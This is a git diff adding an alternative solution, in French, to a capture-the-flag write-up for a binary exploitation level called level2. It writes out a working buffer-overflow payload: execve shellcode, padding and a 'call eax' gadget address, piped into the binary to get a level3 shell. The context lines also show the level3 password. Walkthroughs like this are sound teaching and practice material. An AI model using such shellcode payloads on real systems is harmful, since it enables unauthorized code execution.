@@ -52,3 +52,11 @@ pwd
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
+
+## Solution alternative
+- Cette fois-ci, nous allons directement injecter notre *payload* dans l'entrée du binaire, via un [*shellcode*](https://en.wikipedia.org/wiki/Shellcode) (en l'espèce, [celui-ci](http://shell-storm.org/shellcode/files/shellcode-575.php)).
+- La vérification d'adresse nous empêche d'utiliser le dessous de la *stack* ; nous allons donc plutôt chercher dans la section `.text` du binaire. Plus précisément, nous recherchons une instruction `call eax` (qui va ensuite appeller notre *shellcode*) : `objdump -d level2 | grep "call.*eax"`. On en trouve une à l'adresse `0x080484cf`.
+- On reprend donc la même logique que pour le [level1](/level1/README.md) :
+    - on place notre *payload* dans un fichier : `python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 59 + '\xcf\x84\x04\x08'" > /tmp/lvl2`
+    - on lit ce fichier dans l'entrée standard du binaire : `cat /tmp/lvl2 - | ./level2`
+- Une fois dans le shell, `whoami` nous confirme que l'on est bien `level3`. Il reste juste à `cat /home/user/level3/.pass`.
